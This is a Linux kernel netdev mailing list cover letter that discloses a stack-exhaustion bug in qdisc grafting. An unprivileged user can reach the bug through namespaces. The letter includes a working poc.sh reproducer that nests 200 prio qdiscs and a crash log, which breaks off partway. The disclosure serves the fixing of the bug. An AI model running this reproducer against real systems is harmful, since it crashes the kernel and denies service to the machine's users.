Received: from mail-pf1-f173.google.com (mail-pf1-f173.google.com [209.85.210.173])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A0EA2455166
	for <netdev@vger.kernel.org>; Wed, 29 Jul 2026 15:40:59 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.173
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785339661; cv=none; b=QBx4EYgLKNyMyaEvvwZpzZPRVV9cM2U+shmh71JHp3kWwJKO9i9Mr2S91c0HwAhOXfg3dnZIO2NaAQSCBNoKhbsbKFNTpJZj5k8CLto61cpN5Aqa4lxEObszK+rGHUpI0CmUVNQzzDkmD4MV4uvX/NBdaeQxgZZmvKsR0q1QXCc=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785339661; c=relaxed/simple;
	bh=YIJwtIKpAcchEBQmfzVlmXgJTsGoetB9BnldoIU9kG8=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=tvME1COpPGsQ7LwvezUl58zVsKapgYdys7JFn06d89N6i8VNUbtWqqRmcE9tmIowPCn8NXRp31ztc9Nzt4aARwlwmIZaVP1c+6mto8qmWERyDEtLT5PZqtF4Tlbt/6rxNDvRkXnDYfDayKH33WSFZbdNjutcUA6+sKdQ9Z0AGo0=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=aRcayMF+; arc=none smtp.client-ip=209.85.210.173
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="aRcayMF+"
Received: by mail-pf1-f173.google.com with SMTP id d2e1a72fcca58-84861fc51f5so794628b3a.1
        for <netdev@vger.kernel.org>; Wed, 29 Jul 2026 08:40:59 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1785339659; x=1785944459; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=0piHDydkqpf6/U80hNVrDet5U1Caqs01CfrTCF8O85o=;
        b=aRcayMF+E7SOU0880E+1+1QNRBDfbrBJx/j3SKJ+3OXE7C0XRRvSbF20KAfMzkWEEQ
         WFBY+f0v8StWsFE5jwUDADPrAvA8b7HfEz0Ll6aVcDgpD1KMJEHbUjv8dQYARMkmVjg8
         hcJLcOLy99+KLAz4u4Db4vSKK988DQ2mZcIbErYQeUNKOVvHqnNx0ikxWryGhs2+u5KO
         3zcc1q7Yy6+WGc9ubU4hngHpV4OztqMTCc8rfBHis6r5IknMVBE+7o1i26TpnqcUhIDk
         +ZYyMovj9dJEPsjftoi4HFvFrStXB7OpA414TaABQ+zRmHwA+YZzTwQRs+IFzssacK8F
         nQuQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785339659; x=1785944459;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=0piHDydkqpf6/U80hNVrDet5U1Caqs01CfrTCF8O85o=;
        b=duNdu8lEh9I20yA1z7qVfFBgex2qBYgtFL1trRCL/3z1o0KQAZg5vScDQ8pupWY7bt
         HCY3BtUidmWlkYDb/m7ZzP5hyDCEpmq3G+aAG3mdT8nx7PNNnRZ7plv3SpUccdmMB+S9
         FpFQrZleJRU+bK8ETZZRgOr9q5pnjfsUXxS6eD3YQEpbR36Jai32e8fQr09MLFNNA9H4
         1one4eHhcWb+5YY+m7hC25UsiRrU4BjpL++oVnISwhq8cNH9WEtXOEDdc6WLg8LXs23y
         bfHvwWqxbjHUiOrVvIMG657d/KaXu3tnIEu1isGu8npxqRlqm3DFDWlJmGjOfMYsksXf
         XF8w==
X-Gm-Message-State: AOJu0Yx+jvj1mY1DPvaV2gQ7b+rpolpTdLNFcsqweuSsJk+j4ehml/aN
	NQZcA4PsUbhhMhwo46A7ivMgUNZlN83/k3GXSh5afCZtaM20tTPXKbo9VQPODbDgxhU=
X-Gm-Gg: AR+sD102+YwpzzSu0iQvqxDoWRctp4zAhNCs+PwnnlYBx+bdOoe89mjnColqSwq7eA+
	yia4f+NJT99ajWSyykw1d/zGoPGfxswiWiOh7ZsnulLdpSstdjTsvZKIHcEbwNDb9GA4Xz9cHqE
	nQwS7/wTtkOzUGEsaYCxFWPEiYyEOLM/JDGyFxvGsGQewAHriCMGBzUZQdAzBOQc43NhtJK7PmT
	YhyBymARDqHJbO1h7+jV88bPtX16ylk9N4Y/1ascpH3JVOxINUq51cm3Dt7xd6K2EELiTconwAB
	qG8a8f2PkxFbJwIDN3wMVF7OhxnMVzCxYEzgjfs2lVbGWWugHGOEIHEjcbiud4Mm/SKJ1tcuVAp
	3myZIXedYIeYWfQLm8MlvzJX8y9NUv8/+NWlhilsQg+lsjPB/54O3pUGPwjAJ4WDJUuiMh4WBIy
	WdwBKgzzlNmApJEklyOHA0emEqjI5psoSj5v8DpoMv6vQ+Z7StyIvAYzW8Ir28OWV3mEataDSna
	Nxz
X-Received: by 2002:a05:6a00:238b:b0:848:75b5:1dd4 with SMTP id d2e1a72fcca58-84e9335a761mr7333547b3a.59.1785339658490;
        Wed, 29 Jul 2026 08:40:58 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([165.232.167.5])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84e9fe2153csm1618056b3a.3.2026.07.29.08.40.53
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 29 Jul 2026 08:40:58 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: netdev@vger.kernel.org
Cc: jhs@mojatatu.com,
	jiri@resnulli.us,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	milkory@outlook.com,
	enjou1224z@gmail.com
Subject: [PATCH net 0/1] net/sched: fix qdisc graft hierarchy validation
Date: Wed, 29 Jul 2026 23:40:47 +0800
Message-ID: <cover.1785304107.git.milkory@outlook.com>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zijie Huang <milkory@outlook.com>

Hi Linux kernel maintainers,

We found and validated a issue in net/sched/sch_api.c. The bug is reachable
by a non-root user via user and net namespace. We've tested it, and it
should not affect any other functionality.

We will provide detailed information about the bug in this email, along
with a PoC to trigger it.

---- details below ----

Bug details:

The qdisc create-and-graft path allows users to keep attaching new classful
qdiscs under an already deep parent hierarchy. Such a hierarchy can later
be walked recursively and exhaust the kernel stack.

This patch adds a parent-depth check before qdisc_create() and rejects
creating a new qdisc when the parent hierarchy is already too deep.

Reproducer:

    chmod +x ./poc.sh
    ./poc.sh namespace

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/sh
set -eu
PATH=/usr/sbin:/usr/bin:/sbin:/bin

DEPTH="${DEPTH:-200}"
IFACE0="${IFACE0:-veth0}"
IFACE1="${IFACE1:-veth1}"
MODE="${1:-root}"

setup_and_trigger() {
	ip link del "$IFACE0" 2>/dev/null || true
	ip link add "$IFACE0" type veth peer name "$IFACE1"

	sysctl -q -w "net.ipv6.conf.$IFACE0.disable_ipv6=1"
	sysctl -q -w "net.ipv6.conf.$IFACE1.disable_ipv6=1"

	ip addr add 10.0.0.1/24 dev "$IFACE0"
	ip addr add 10.0.0.2/24 dev "$IFACE1"

	tc qdisc add dev "$IFACE0" root handle 1: prio

	i=1
	while [ "$i" -le "$DEPTH" ]; do
		parent_major="$(printf '%x' "$i")"
		child_major="$(printf '%x' $((i + 1)))"
		tc qdisc add dev "$IFACE0" parent "${parent_major}:2" handle "${child_major}:" prio
		i=$((i + 1))
	done

	ip link set "$IFACE0" up
	ip link set "$IFACE1" up

	ping -c 1 -W 1 -I "$IFACE0" 10.0.0.2 >/dev/null
}

case "$MODE" in
root)
	setup_and_trigger
	;;
namespace)
	exec unshare -Urn sh "$0" inner
	;;
inner)
	setup_and_trigger
	;;
*)
	echo "usage: $0 [root|namespace]" >&2
	exit 1
	;;
esac

------END poc.sh--------

----BEGIN crash log----

[  192.465021][    C0] BUG: TASK stack guard page was hit at ffffc9000dbd7fd8 (stack is ffffc9000dbd8000..ffffc9000dbe0000)
[  192.465084][    C0] Oops: stack guard page: 0000 [#1] SMP KASAN NOPTI
[  192.465127][    C0] CPU: 0 UID: 1001 PID: 10556 Comm: ping Not tainted 7.2.0-rc4-00413-ge095f249e220 #1 PREEMPT(full) 
[  192.465149][    C0] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.17.0-debian-1.17.0-1 04/01/2014
[  192.465153][    C0] RIP: 0010:prio_enqueue+0x2e/0x7c0
[  192.465254][    C0] Code: 55 48 89 e5 41 57 41 56 41 55 49 bd 00 00 00 00 00 fc ff df 41 54 49 89 fc 53 48 89 f3 48 83 e4 f0 48 83 c4 80 4c 8d 74 24 20 <48> 89 54 24 18 48 c7 44 24 20 b3 8a b5 41 49 c1 ee 03 48 c7 44 24
[  192.465260][    C0] RSP: 0018:ffffc9000dbd7fe0 EFLAGS: 00010283
[  192.465274][    C0] RAX: ffffffff89a12450 RBX: ffff88804c17cc00 RCX: ffffffff89a1298d
[  192.465278][    C0] RDX: ffffc9000dbdf380 RSI: ffff88804c17cc00 RDI: ffff88803c2ca580
[  192.465282][    C0] RBP: ffffc9000dbd8090 R08: 0000000000000005 R09: 000000000000ffff
[  192.465286][    C0] R10: 0000000000000000 R11: 0000000000000001 R12: ffff88803c2ca580
[  192.465289][    C0] R13: dffffc0000000000 R14: ffffc9000dbd8000 R15: ffff88804c179280
[  192.465293][    C0] FS:  00007f69fe54f000(0000) GS:ffff8880d62af000(0000) knlGS:0000000000000000
[  192.465306][    C0] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  192.465310][    C0] CR2: ffffc9000dbd7fd8 CR3: 000000004b49e000 CR4: 0000000000352ef0
[  192.465314][    C0] Call Trace:
[  192.465316][    C0]  <TASK>
[  192.465319][    C0]  ? tcf_classify+0x3db/0x1250
[  192.465343][    C0]  prio_enqueue+0x209/0x7c0
[  192.465349][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465356][    C0]  prio_enqueue+0x209/0x7c0
[  192.465363][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465370][    C0]  prio_enqueue+0x209/0x7c0
[  192.465376][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465384][    C0]  prio_enqueue+0x209/0x7c0
[  192.465390][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465398][    C0]  prio_enqueue+0x209/0x7c0
[  192.465404][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465411][    C0]  prio_enqueue+0x209/0x7c0
[  192.465417][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465425][    C0]  prio_enqueue+0x209/0x7c0
[  192.465431][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465439][    C0]  prio_enqueue+0x209/0x7c0
[  192.465445][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465453][    C0]  prio_enqueue+0x209/0x7c0
[  192.465459][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465467][    C0]  prio_enqueue+0x209/0x7c0
[  192.465473][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465480][    C0]  prio_enqueue+0x209/0x7c0
[  192.465486][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465494][    C0]  prio_enqueue+0x209/0x7c0
[  192.465500][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465507][    C0]  prio_enqueue+0x209/0x7c0
[  192.465513][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465520][    C0]  prio_enqueue+0x209/0x7c0
[  192.465527][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465562][    C0]  prio_enqueue+0x209/0x7c0
[  192.465656][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465665][    C0]  prio_enqueue+0x209/0x7c0
[  192.465673][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465682][    C0]  prio_enqueue+0x209/0x7c0
[  192.465690][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465699][    C0]  prio_enqueue+0x209/0x7c0
[  192.465707][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465716][    C0]  prio_enqueue+0x209/0x7c0
[  192.465735][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465744][    C0]  prio_enqueue+0x209/0x7c0
[  192.465753][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465779][    C0]  prio_enqueue+0x209/0x7c0
[  192.465807][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465816][    C0]  prio_enqueue+0x209/0x7c0
[  192.465824][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465834][    C0]  prio_enqueue+0x209/0x7c0
[  192.465843][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465851][    C0]  prio_enqueue+0x209/0x7c0
[  192.465858][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465865][    C0]  prio_enqueue+0x209/0x7c0
[  192.465871][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465879][    C0]  prio_enqueue+0x209/0x7c0
[  192.465885][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465893][    C0]  prio_enqueue+0x209/0x7c0
[  192.465899][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465907][    C0]  prio_enqueue+0x209/0x7c0
[  192.465913][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465921][    C0]  prio_enqueue+0x209/0x7c0
[  192.465927][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465935][    C0]  prio_enqueue+0x209/0x7c0
[  192.465941][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465949][    C0]  prio_enqueue+0x209/0x7c0
[  192.465955][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465962][    C0]  prio_enqueue+0x209/0x7c0
[  192.465969][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465976][    C0]  prio_enqueue+0x209/0x7c0
[  192.465983][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.465990][    C0]  prio_enqueue+0x209/0x7c0
[  192.465996][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466004][    C0]  prio_enqueue+0x209/0x7c0
[  192.466011][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466018][    C0]  prio_enqueue+0x209/0x7c0
[  192.466025][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466032][    C0]  prio_enqueue+0x209/0x7c0
[  192.466039][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466046][    C0]  prio_enqueue+0x209/0x7c0
[  192.466053][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466060][    C0]  prio_enqueue+0x209/0x7c0
[  192.466066][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466074][    C0]  prio_enqueue+0x209/0x7c0
[  192.466080][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466088][    C0]  prio_enqueue+0x209/0x7c0
[  192.466094][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466102][    C0]  prio_enqueue+0x209/0x7c0
[  192.466108][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466116][    C0]  prio_enqueue+0x209/0x7c0
[  192.466122][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466130][    C0]  prio_enqueue+0x209/0x7c0
[  192.466136][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466144][    C0]  prio_enqueue+0x209/0x7c0
[  192.466150][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466158][    C0]  prio_enqueue+0x209/0x7c0
[  192.466164][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466172][    C0]  prio_enqueue+0x209/0x7c0
[  192.466178][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466186][    C0]  prio_enqueue+0x209/0x7c0
[  192.466192][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466200][    C0]  prio_enqueue+0x209/0x7c0
[  192.466206][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466228][    C0]  prio_enqueue+0x209/0x7c0
[  192.466235][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466243][    C0]  prio_enqueue+0x209/0x7c0
[  192.466249][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466258][    C0]  prio_enqueue+0x209/0x7c0
[  192.466264][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466272][    C0]  prio_enqueue+0x209/0x7c0
[  192.466278][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466285][    C0]  prio_enqueue+0x209/0x7c0
[  192.466291][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466299][    C0]  prio_enqueue+0x209/0x7c0
[  192.466305][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466312][    C0]  prio_enqueue+0x209/0x7c0
[  192.466319][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466326][    C0]  prio_enqueue+0x209/0x7c0
[  192.466333][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466340][    C0]  prio_enqueue+0x209/0x7c0
[  192.466347][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466354][    C0]  prio_enqueue+0x209/0x7c0
[  192.466360][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466367][    C0]  prio_enqueue+0x209/0x7c0
[  192.466373][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466380][    C0]  prio_enqueue+0x209/0x7c0
[  192.466387][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466395][    C0]  prio_enqueue+0x209/0x7c0
[  192.466401][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466409][    C0]  prio_enqueue+0x209/0x7c0
[  192.466415][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466422][    C0]  prio_enqueue+0x209/0x7c0
[  192.466428][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466436][    C0]  prio_enqueue+0x209/0x7c0
[  192.466442][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466449][    C0]  prio_enqueue+0x209/0x7c0
[  192.466455][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466471][    C0]  prio_enqueue+0x209/0x7c0
[  192.466477][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466484][    C0]  prio_enqueue+0x209/0x7c0
[  192.466490][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466498][    C0]  prio_enqueue+0x209/0x7c0
[  192.466504][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466512][    C0]  prio_enqueue+0x209/0x7c0
[  192.466518][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466525][    C0]  prio_enqueue+0x209/0x7c0
[  192.466532][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466539][    C0]  prio_enqueue+0x209/0x7c0
[  192.466545][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466553][    C0]  prio_enqueue+0x209/0x7c0
[  192.466559][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466567][    C0]  prio_enqueue+0x209/0x7c0
[  192.466573][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466581][    C0]  prio_enqueue+0x209/0x7c0
[  192.466587][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466594][    C0]  prio_enqueue+0x209/0x7c0
[  192.466600][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466608][    C0]  prio_enqueue+0x209/0x7c0
[  192.466614][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466621][    C0]  prio_enqueue+0x209/0x7c0
[  192.466628][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466635][    C0]  prio_enqueue+0x209/0x7c0
[  192.466641][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466649][    C0]  prio_enqueue+0x209/0x7c0
[  192.466655][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466662][    C0]  prio_enqueue+0x209/0x7c0
[  192.466668][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466675][    C0]  prio_enqueue+0x209/0x7c0
[  192.466682][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466690][    C0]  prio_enqueue+0x209/0x7c0
[  192.466696][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466703][    C0]  prio_enqueue+0x209/0x7c0
[  192.466709][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466716][    C0]  prio_enqueue+0x209/0x7c0
[  192.466722][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466730][    C0]  prio_enqueue+0x209/0x7c0
[  192.466736][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466743][    C0]  prio_enqueue+0x209/0x7c0
[  192.466749][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466757][    C0]  prio_enqueue+0x209/0x7c0
[  192.466763][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466770][    C0]  prio_enqueue+0x209/0x7c0
[  192.466776][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466784][    C0]  prio_enqueue+0x209/0x7c0
[  192.466790][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466797][    C0]  prio_enqueue+0x209/0x7c0
[  192.466803][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466810][    C0]  prio_enqueue+0x209/0x7c0
[  192.466816][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466824][    C0]  prio_enqueue+0x209/0x7c0
[  192.466830][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466837][    C0]  prio_enqueue+0x209/0x7c0
[  192.466844][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466851][    C0]  prio_enqueue+0x209/0x7c0
[  192.466857][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466865][    C0]  prio_enqueue+0x209/0x7c0
[  192.466871][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466878][    C0]  prio_enqueue+0x209/0x7c0
[  192.466884][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466892][    C0]  prio_enqueue+0x209/0x7c0
[  192.466898][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466905][    C0]  prio_enqueue+0x209/0x7c0
[  192.466911][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466919][    C0]  prio_enqueue+0x209/0x7c0
[  192.466925][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466932][    C0]  prio_enqueue+0x209/0x7c0
[  192.466939][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466946][    C0]  prio_enqueue+0x209/0x7c0
[  192.466952][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466959][    C0]  prio_enqueue+0x209/0x7c0
[  192.466965][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466973][    C0]  prio_enqueue+0x209/0x7c0
[  192.466979][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.466986][    C0]  prio_enqueue+0x209/0x7c0
[  192.466992][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467000][    C0]  prio_enqueue+0x209/0x7c0
[  192.467014][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467022][    C0]  prio_enqueue+0x209/0x7c0
[  192.467028][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467035][    C0]  prio_enqueue+0x209/0x7c0
[  192.467043][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467050][    C0]  prio_enqueue+0x209/0x7c0
[  192.467056][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467063][    C0]  prio_enqueue+0x209/0x7c0
[  192.467070][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467077][    C0]  prio_enqueue+0x209/0x7c0
[  192.467083][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467091][    C0]  prio_enqueue+0x209/0x7c0
[  192.467097][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467104][    C0]  prio_enqueue+0x209/0x7c0
[  192.467111][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467118][    C0]  prio_enqueue+0x209/0x7c0
[  192.467124][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467132][    C0]  prio_enqueue+0x209/0x7c0
[  192.467138][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467145][    C0]  prio_enqueue+0x209/0x7c0
[  192.467152][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467159][    C0]  prio_enqueue+0x209/0x7c0
[  192.467165][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467174][    C0]  prio_enqueue+0x209/0x7c0
[  192.467180][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467188][    C0]  prio_enqueue+0x209/0x7c0
[  192.467194][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467201][    C0]  prio_enqueue+0x209/0x7c0
[  192.467207][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467215][    C0]  prio_enqueue+0x209/0x7c0
[  192.467221][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467228][    C0]  prio_enqueue+0x209/0x7c0
[  192.467235][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467242][    C0]  prio_enqueue+0x209/0x7c0
[  192.467248][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467256][    C0]  prio_enqueue+0x209/0x7c0
[  192.467262][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467269][    C0]  prio_enqueue+0x209/0x7c0
[  192.467275][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467283][    C0]  prio_enqueue+0x209/0x7c0
[  192.467289][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467297][    C0]  prio_enqueue+0x209/0x7c0
[  192.467303][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467310][    C0]  prio_enqueue+0x209/0x7c0
[  192.467317][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467324][    C0]  prio_enqueue+0x209/0x7c0
[  192.467330][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467338][    C0]  prio_enqueue+0x209/0x7c0
[  192.467344][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467351][    C0]  prio_enqueue+0x209/0x7c0
[  192.467357][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467365][    C0]  prio_enqueue+0x209/0x7c0
[  192.467371][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467379][    C0]  prio_enqueue+0x209/0x7c0
[  192.467385][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467392][    C0]  prio_enqueue+0x209/0x7c0
[  192.467398][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467406][    C0]  prio_enqueue+0x209/0x7c0
[  192.467412][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467419][    C0]  prio_enqueue+0x209/0x7c0
[  192.467425][    C0]  ? __pfx_stack_trace_save+0x10/0x10
[  192.467432][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467439][    C0]  prio_enqueue+0x209/0x7c0
[  192.467445][    C0]  ? vma_complete+0x9f4/0xf70
[  192.467472][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467478][    C0]  ? __lock_acquire+0x49f/0x1a40
[  192.467487][    C0]  prio_enqueue+0x209/0x7c0
[  192.467493][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467500][    C0]  prio_enqueue+0x209/0x7c0
[  192.467506][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467513][    C0]  ? __pfx_stack_trace_consume_entry+0x10/0x10
[  192.467520][    C0]  prio_enqueue+0x209/0x7c0
[  192.467526][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467533][    C0]  prio_enqueue+0x209/0x7c0
[  192.467539][    C0]  ? stack_trace_save+0x8e/0xc0
[  192.467545][    C0]  ? __pfx_prio_enqueue+0x10/0x10
[  192.467551][    C0]  ? stack_depot_save_flags+0x27/0x9d0
[  192.467577][    C0]  prio_enqueue+0x209/0x7c0
[  192.467583][    C0]  ? mas_wr_split+0x1c23/0x3960
